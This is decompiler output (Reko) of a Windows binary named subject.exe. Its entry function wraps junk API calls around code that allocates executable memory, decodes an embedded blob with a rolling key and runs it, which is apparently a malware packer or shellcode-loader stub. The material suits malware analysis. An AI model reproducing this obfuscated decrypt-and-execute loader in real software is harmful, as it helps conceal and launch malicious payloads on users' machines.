// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 004012F8: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	CharUpperA(fp - 0x98);
	OpenEventW(0x00, 0x00, fp - 188);
	GetDC(0x00);
	Eq_30 ecx_31 = fp - 188;
	if (GetCurrentThreadId() == 0x026D)
		ecx_31 = fp - 188 ^ dwArg05;
	word32 esp_66;
	word32 ebp_67;
	byte SCZO_68;
	word32 eax_69;
	byte Z_70;
	word32 edx_71;
	byte SZO_72;
	byte C_73;
	word32 ecx_74;
	Eq_2 ebx_75;
	Eq_2 esi_76;
	Eq_2 edi_77;
	_set_app_type();
	GetFileAttributesA(fp - 0xB4);
	CharUpperA(fp - 232);
	GetProcessHeap();
	IsWindow(OpenMutexA(CharUpperA(fp - 0xA8) & 0x08, 0x00, fp - 0x9C) - dwArg00);
	Eq_2 ecx_116 = (fp - 0xA8 & 0x011C) - dwArg01;
	Eq_97 v22_121 = dwLoc0120 - (fp - 0x04);
	Eq_2 edx_123 = fp - 0x04 ^ 0x0611;
	if ((GetCurrentThreadId() & 2788) != ecx_116)
	{
		edx_123 = edx_123 | ecx_116;
		dwLocB8 = dwLocB8 + (ecx_116 | dwLoc0140);
		ecx_116 = fp - 0x04;
	}
	*(fp - 664) = fp - 0x04;
	*(fp - 664) = *(fp - 664) - 0x5C;
	(fp - 668)->u0 = 0x00;
	Eq_2 eax_148 = GetClientRect(*(fp - 668), *(fp - 664)) | dwLoc0180;
	if (eax_148 != edx_123)
	{
		eax_148 = fp - 0x0228;
		edx_123 = (edx_123 ^ dwLoc0225 ^ dwLoc021C) & dwLoc0227;
	}
	(fp - 0x02A0)->u0 = 0x00;
	Eq_2 edx_157 = edx_123 ^ 0x21CD;
	Eq_166 C_161 = cond(eax_148 - edx_157);
	if (eax_148 != edx_157)
	{
		eax_148 = eax_148 - 13345;
		edx_157 = (word32) (edx_157 * 0x02) + (eax_148 < edx_157);
		ecx_116 = ecx_116 + v22_121;
		C_161 = cond(eax_148);
	}
	(fp - 676)->u0 = 0x00;
	if (eax_148 + edx_157 + C_161 == 0x0330)
	{
		edx_157 = edx_157 ^ 7664;
		ecx_116 = ecx_116 - 0x292F;
	}
	(fp - 0x02A8)->u0 = 0x00;
	Eq_202 eax_184 = CreateItemMoniker(*(fp - 0x02A8), *(fp - 676), *(fp - 0x02A0));
	ui32 eax_185 = eax_184 ^ 0x80070057;
	if ((eax_184 ^ 0x80070057) == 0x00)
	{
		Eq_2 eax_231 = (word32) edx_157 + (eax_184 ^ 0x80070057);
		if (eax_231 == 0x00)
		{
			edx_157 = fp - 200;
			eax_231 = eax_231 - dwLocB8;
			ecx_116 = (ecx_116 & dwLocBD) - dwLocC3;
		}
		*(fp - 0x02AC) = eax_231;
		*(fp - 688) = ecx_116;
		*(fp - 0x02B4) = edx_157;
		*(fp - 696) = ebx_75;
		*(fp - 700) = fp - 0x02A8;
		*(fp - 0x02C0) = fp - 0x04;
		*(fp - 0x02C4) = esi_76;
		*(fp - 0x02C8) = edi_77;
		(fp - 0x02CC)->u0 = 0x40;
		Eq_286 ecx_263 = (ecx_116 & 0x2F37) + dwLoc03;
		if (fp - 0x04 != ecx_263)
			ecx_263 = fp - 484;
		(fp - 0x02D0)->u0 = 0x1000;
		(fp - 0x02D4)->u0 = 0x2000;
		(fp - 0x02D8)->u0 = 0x00;
		Eq_2 eax_291 = VirtualAlloc(*(fp - 0x02D8), *(fp - 0x02D4), *(fp - 0x02D0), *(fp - 0x02CC));
		if (dwLoc0154 == ecx_263)
			ecx_263 = (word32) ecx_263 + 0x00001D56 ^ 10339;
		Eq_351 eax_315 = (fp - 0x04 ^ dwLoc010E) + dwLoc0118;
		ui32 ecx_317 = (word32) eax_315 + (ecx_263 - dwLoc01B4 | dwArg0B);
		struct Eq_363 * edi_316 = &globals->t412E33;
		Eq_2 esi_318 = eax_291;
		Eq_366 edx_321 = fp - 9409;
		word32 dwLoc68_322 = 2742709975;
		Eq_371 ecx_323 = ecx_317 - 0x28C3;
		if (ecx_317 != 0x28C3)
			ecx_323 = ecx_317 - 0x28C3 | 0x28C3;
		do
		{
			word32 ebx_341 = edi_316->dw0000 + dwLoc68_322;
			*esi_318 = ebx_341;
			dwLoc68_322 = dwLoc68_322 + 1648285686;
			Eq_390 edx_346 = edx_321 - eax_315;
			eax_315 = eax_315 | 0x2279;
			ptr32 edi_349 = (char *) edi_316 - 80554824;
			ecx_323 = ((ecx_323 ^ dwLoc4C) & edx_321) - dwLoc8C;
			word32 esi_352 = esi_318 + 0xA596E2A8;
			if (eax_315 == 1007)
			{
				edx_346 = fp - 388 - ecx_323;
				eax_315 = (eax_315 | 0x38A7) & 0x3565;
			}
			edi_316 = edi_349 + 80554828;
			edx_321 = (word32) edx_346 + 0x00003BBE;
			esi_318 = esi_352 + 1516838236;
			if ((dwLoc0234 & ecx_323) != 0x00)
				eax_315 = eax_315 ^ 0x34ED;
		} while (edi_349 != 76278925);
		word32 esp_373;
		word32 ebp_374;
		byte SCZO_375;
		byte Z_377;
		ui32 edx_378;
		byte SZO_379;
		byte C_380;
		word32 ecx_381;
		word32 ebx_382;
		word32 esi_383;
		word32 edi_384;
		eax_291();
		if (eax_185 == edx_378)
			eax_185 = eax_185 & 0x30B6;
	}
	return eax_185;
}

